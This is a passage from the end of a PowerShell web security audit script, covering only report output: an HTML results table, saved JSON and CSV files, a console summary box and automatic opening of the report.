    <div class="header">
        <h1>Security Audit Report</h1>
        <p>Target: $($TargetURL) | Time: $((Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))</p>
    </div>

    <div class="summary">
        <h2>Summary</h2>
        <p><strong>Total Tests:</strong> $($global:stats.TotalTests)</p>
        <p><strong>Vulnerabilities Found:</strong> $($global:vulnerabilities.Count)</p>
        <p><strong>Warnings:</strong> $($global:warnings.Count)</p>
        <p><strong>Execution Time:</strong> $($global:stats.ExecutionTimeSeconds) seconds</p>
    </div>

    <div class="results">
        <h2>Detailed Results</h2>
        <table>
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Category</th>
                    <th>Test Name</th>
                    <th>Status</th>
                    <th>Severity</th>
                    <th>Details</th>
                </tr>
            </thead>
            <tbody>
                $($global:results | ForEach-Object {
                    "
                    <tr class='$(($_.Status))'>
                        <td>$($_.Timestamp)</td>
                        <td>$($_.Category)</td>
                        <td>$($_.TestName)</td>
                        <td>$($_.Status)</td>
                        <td class='$(($_.Severity))'>$($_.Severity)</td>
                        <td>$($_.Details)</td>
                    </tr>
                    "
                })
            </tbody>
        </table>
    </div>

</body>
</html>
"@
$htmlContent | Out-File -FilePath $htmlReportPath -Encoding UTF8

Write-Log "HTML Report saved to: $htmlReportPath" -Console
Write-Log "JSON Data saved to: $jsonReportPath" -Console
Write-Log "CSV Results saved to: $csvReportPath" -Console

# Final summary table (ASCII only)
Write-Host "`n"
Write-Host "   ┌─────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
Write-Host "   │                      AUDIT RESULTS                      │" -ForegroundColor Cyan
Write-Host "   ├─────────────────────────────────────────────────────────┤" -ForegroundColor Cyan
Write-Host "   │ Total Requests:       $($global:stats.TotalRequests.ToString().PadRight(25)) │" -ForegroundColor White
Write-Host "   │ Total Tests Run:      $($global:stats.TotalTests.ToString().PadRight(25)) │" -ForegroundColor White
Write-Host "   │ Vulnerabilities:      $($global:vulnerabilities.Count.ToString().PadRight(25)) │" -ForegroundColor Red
Write-Host "   │ Warnings:             $($global:warnings.Count.ToString().PadRight(25)) │" -ForegroundColor Yellow
Write-Host "   │ Execution Time:       $($global:stats.ExecutionTimeSeconds.ToString() + 's').PadRight(25) │" -ForegroundColor White
Write-Host "   ├─────────────────────────────────────────────────────────┤" -ForegroundColor Cyan
Write-Host "   │ 🌐 HTML Report:       $($htmlReportPath.Substring($htmlReportPath.LastIndexOf('\')+1).PadRight(25)) │" -ForegroundColor White
Write-Host "   │ 📊 JSON Data:         $($jsonReportPath.Substring($jsonReportPath.LastIndexOf('\')+1).PadRight(25)) │" -ForegroundColor White
Write-Host "   │ 📈 CSV Results:       $($csvReportPath.Substring($csvReportPath.LastIndexOf('\')+1).PadRight(25)) │" -ForegroundColor White
Write-Host "   │ 🔍 Evidence:          evidence\ (multiple files)".PadRight(50) + " │" -ForegroundColor White
Write-Host "   │ 📝 Logs:              logs\audit_$timestamp.log".PadRight(50) + " │" -ForegroundColor White
Write-Host "   └─────────────────────────────────────────────────────────┘" -ForegroundColor Cyan

Write-Host "`n📁 Audit Directory: $baseDir" -ForegroundColor White

# Try to open reports
try {
    Write-Host "`n🔄 Opening reports..." -ForegroundColor Cyan
    Start-Process $htmlReportPath
    Start-Process $directories.Reports
    Write-Host "✅ Reports opened successfully" -ForegroundColor Green
} catch {
    Write-Host "⚠️  Could not open reports automatically" -ForegroundColor Yellow
}

Write-Host "`n══════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "SECURITY AUDIT COMPLETE - $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Cyan
Write-Host "══════════════════════════════════════════════════════════" -ForegroundColor Cyan
#endregion